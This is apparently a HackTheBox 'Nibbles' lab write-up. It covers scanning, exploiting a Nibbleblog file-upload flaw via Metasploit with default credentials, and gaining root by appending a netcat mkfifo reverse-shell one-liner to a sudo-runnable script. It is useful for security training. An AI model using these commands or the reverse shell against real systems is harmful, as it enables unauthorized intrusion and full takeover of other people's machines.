# Nibbles | HTB
### Difficulty : Easy
-------------------------------

Let's start with nmap scan to find open ports and services within the system:

```bash
nmap -p- -T4 -A 10.10.10.75 -oN nibbles.nmap
```

-p- scans all ports instead the 1000 common ports scan defaultivy way.

-T4  - increase the spped of the scan.

-A  - aggressive scan to gather more information about the system.

-oN - saves the output to a file.


Results:

```bash
Nmap scan report for 10.10.10.75
Host is up (0.12s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=3/18%OT=22%CT=1%CU=33777%PV=Y%DS=2%DC=T%G=Y%TM=65F8
OS:88D9%P=x86_64-pc-linux-gnu)SEQ(SP=100%GCD=1%ISR=10D%TI=Z%II=I%TS=8)SEQ(S
OS:P=100%GCD=1%ISR=10D%TI=Z%CI=I%II=I%TS=8)SEQ(SP=101%GCD=1%ISR=10C%TI=Z%II
OS:=I%TS=8)SEQ(SP=102%GCD=1%ISR=10C%TI=Z%TS=8)OPS(O1=M53CST11NW7%O2=M53CST1
OS:1NW7%O3=M53CNNT11NW7%O4=M53CST11NW7%O5=M53CST11NW7%O6=M53CST11)WIN(W1=71
OS:20%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN(R=Y%DF=Y%T=40%W=7210%O=M5
OS:3CNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4
OS:(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%
OS:F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%
OS:T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%R
OS:ID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 53/tcp)
HOP RTT       ADDRESS
1   230.60 ms 10.10.14.1
2   230.77 ms 10.10.10.75

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 515.57 seconds
```

I'll try to find any intersting directory within the system with:

```bash
└─# gobuster dir -u http://10.10.10.75 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

-u - the traget url.

-w - the wordlist to scan the system with.

While scanning, I navigated to the address within the browser. I decided to view the source code.


![image](https://cdn-images-1.medium.com/max/1000/1*byJhHlMqipaqplu6OGRR3w.png)


It sends us to /nibbleblog/.


![image](https://cdn-images-1.medium.com/max/1000/1*bXNAX8k7NVW5eWed7Iu8nw.png)


The previous gobuster scan didn't find any directory, but after we found the blog, let's scan another time but with the /nibbleblog/.

Results:

![image](https://cdn-images-1.medium.com/max/1000/1*8W4FF3LwC2N5AqNdcplJKA.png)


After traveling betweem the directories within /admin, I didn't find anything there. 
But there is README file that includes the version of the nibbleblog service.


![image](https://cdn-images-1.medium.com/max/1000/1*Sw-slPkN3-mQNnwhOMbfnw.png)


Let's check if this service at that version is vulnerable.

```bash
searchsploit nibbleblog   
----------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                               |  Path
----------------------------------------------------------------------------- ---------------------------------
Nibbleblog 3 - Multiple SQL Injections                                       | php/webapps/35865.txt
Nibbleblog 4.0.3 - Arbitrary File Upload (Metasploit)                        | php/remote/38489.rb
----------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

Use metasploit to try the Arbitrary File Upload, but after I use "options" to understand what info I need to provide 
to run the exploit, it demends username and password. At that moment, I don't have any credentials.

After some research I found a github that includes the exploit with an example how to use it:

https://github.com/dix0nym/CVE-2015-6967


![image](https://cdn-images-1.medium.com/max/1000/1*3AEzPOCvVD08Rq76Zpms4Q.png)


I decided to provide the path, username and password (it can be default credentials). and then I got meterpreter shell!

On metasploit:

```bash
set lhost <your-ip>

set rhost <target-machine>

set targeturi /nibbleblog/

run

```


![image](https://cdn-images-1.medium.com/max/1000/1*B4Bn9ppeAtkNYmhTibOJrA.png)


Stabilized the shell with:

```bash

python3 -c 'import pty; pty.spawn("/bin/bash")'

```

![image](https://cdn-images-1.medium.com/max/1000/1*QDLymSfm1yv52sq-R4ZXNg.png)

There is zip file maybe there is something:



```bash
unzip personal.zip
```

and there is a script "monitor.sh". Let's check if can we run files as root with:

```bash
sudo -l
```

![image](https://cdn-images-1.medium.com/max/1000/1*2NeIv8555jTiQxE-C9Qk6w.png)


Because we know that this file can run as root so let's upload a reverse shell payload to the file:

```bash
echo 'rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <tun-0> 2222 >/tmp/f' >> monitor.sh    
```

Set netcat listener on your machine:

```bash
nc -lnvp 2222
```

then run monitor.sh :

```bash
sudo /home/nibbler/personal/stuff/monitor.sh
```

and there is reverse shell as root:


![image](https://cdn-images-1.medium.com/max/1000/1*tYtmcGedyOT67-_N1pG50w.png)


grab /root/root.txt

and this is it for now.


***Written by Alon Presman, Penetration Tester and Ethical Hacker.***
























































































